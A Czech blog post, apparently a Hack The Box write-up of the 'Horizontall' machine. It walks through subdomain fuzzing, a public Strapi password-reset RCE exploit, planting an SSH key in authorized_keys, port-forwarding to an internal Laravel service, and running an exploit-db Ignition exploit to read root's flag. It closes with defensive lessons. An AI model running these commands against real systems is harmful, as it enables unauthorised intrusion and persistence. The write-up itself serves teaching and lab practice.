---
layout: post
author: Tomáš Matějíček
title: "Horizontall"
date: 2020-12-04
tags: linux ssh php exploit enumeration privesc
---
## Úvod a kontext

Horizontall je dvoukrokový webový řetězec rozdělený mezi dva různé frameworky. Veřejný vhost `api-prod.horizontall.htb` běží na Strapi a dává první shell přes známou zranitelnost v resetu hesla a instalaci pluginů. Root ale neleží ve Strapi, nýbrž v interním Laravelu dostupném jen na `127.0.0.1:8000`.

To je na tom stroji nejzajímavější: první exploit sice otevře SSH foothold, ale po něm je potřeba přepnout myšlení a hledat, co ještě běží jen lokálně. `netstat` ukáže skrytou službu na `8000` a až SSH port-forward odkryje druhou aplikaci, která vede k rootu.

## Počáteční průzkum

### Veřejný web a vedlejší API vhost

Na první pohled jsou otevřené jen SSH a nginx. Přesně v takové situaci má smysl hledat další hostname. `wfuzz` rychle odhalí `api-prod.horizontall.htb`, který je podstatně zajímavější než hlavní marketingová stránka.
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
wfuzz -H "Host: FUZZ.horizontall.htb" -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt --sc 200 http://10.10.11.105
./dirsearch/dirsearch.py -u http://$IP -e php -x 403 -r
```
```text
22/tcp    open  ssh   OpenSSH 7.6p1 Ubuntu 4ubuntu0.5
80/tcp    open  http  nginx 1.14.0 (Ubuntu)

=> api-prod.horizontall.htb
=> http://api-prod.horizontall.htb/admin/
```

### Identifikace Strapi

Jakmile je známý API vhost a `/admin`, první otázka zní, na čem běží. `whatweb` ukáže Strapi, což je důležité, protože pro starší verze existuje veřejně známá a dobře reprodukovatelná cesta k RCE.
```text
whatweb -v http://api-prod.horizontall.htb
=> Strapi <strapi.io> (from x-powered-by string)
```

## Analýza zjištění

### Zneužití Strapi přes reset hesla a instalaci pluginu

Použitý exploit proti Strapi kombinuje slabou validaci v resetu hesla s mechanikou instalace pluginů. Výsledek je blind RCE, takže je rozumnější nepokoušet se o jednorázový reverzní shell, ale rovnou si zapsat vlastní SSH klíč do `authorized_keys`.
```text
python3 Strapi.py http://api-prod.horizontall.htb
mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." >> ~/.ssh/authorized_keys
```

## Získání přístupu

### SSH jako `strapi`

Blind RCE slouží jen jako bootstrap. Jakmile je klíč zapsaný, nejčistší další krok je SSH na účet `strapi`. To otevře stabilní shell a dovolí číst lokální sockety a interní porty, které zvenku vidět nejsou.
```text
ssh strapi@horizontall.htb
bash

cat /home/developer/user.txt
f6da5b3556062cbd5233fda6c7298960
```

### Co prozradí `netstat`

Lokální enumerace tady není obecná fráze, ale konkrétní rozhodovací bod. `netstat -natp` ukáže procesy poslouchající jen na loopbacku, hlavně `127.0.0.1:8000`. To je silná indicie, že po veřejném Strapi běží na stroji ještě druhá webová aplikace, tentokrát neveřejná.
```text
netstat -natp
tcp  0  0 127.0.0.1:1337  0.0.0.0:*  LISTEN  1896/node /usr/bin/
tcp  0  0 127.0.0.1:8000  0.0.0.0:*  LISTEN  -
tcp  0  0 127.0.0.1:3306  0.0.0.0:*  LISTEN  -
```

Proto následuje port-forward a identifikace interního Laravelu:
```text
ssh strapi@horizontall.htb -L 8000:127.0.0.1:8000
=> Laravel
```

## Eskalace oprávnění

### Laravel Ignition na lokálním portu

Jakmile je interní port přesměrovaný, má smysl hledat veřejný exploit pro daný framework. `searchsploit` ukáže `49424.py`, tedy známou RCE cestu přes Laravel Ignition. Protože je aplikace dostupná jen lokálně, bez port-forwardu by tato část vůbec nepřicházela v úvahu.

Pro praktickou práci s podobnými kandidátními exploity viz i [Searchsploit](/nastroje/searchsploit).
```text
searchsploit laravel
searchsploit -p 49424

python3 /usr/share/exploitdb/exploits/php/webapps/49424.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log "cat /root/root.txt"
=> a5f1e4afb7ee38f979bc33f22bb4e057
```

## Shrnutí klíčových poznatků

- Horizontall není jeden webový exploit, ale návaznost dvou různých aplikací: veřejného Strapi a interního Laravelu.
- První exploit na Strapi byl užitečný hlavně tím, že vytvořil stabilní SSH foothold. Skutečný root přišel až po lokální enumeraci a port-forwardu.
- Interní služby na loopbacku nejsou bezpečné samy o sobě. Jakmile útočník získá shell, lokální-only port se stává normální součástí útokové plochy.

## Co si odnést do praxe

- Admin rozhraní typu Strapi musí být patchovaná stejně rychle jako veřejný frontend. Jakmile na ně existuje veřejný RCE exploit, skrývání za vhost nebo `/admin` nic neřeší.
- SSH foothold je potřeba chápat jako rozšíření útokové plochy o všechny localhost-only služby. Horizontall ukazuje, že to, co není zvenku dostupné, může být po prvním shellu rozhodující.
- Provozovat dvě různé webové platformy na jednom hostu násobí riziko. I kdyby jedna část byla opravená, druhá může po lokálním port-forwardu otevřít root cestu úplně jiným exploitem.
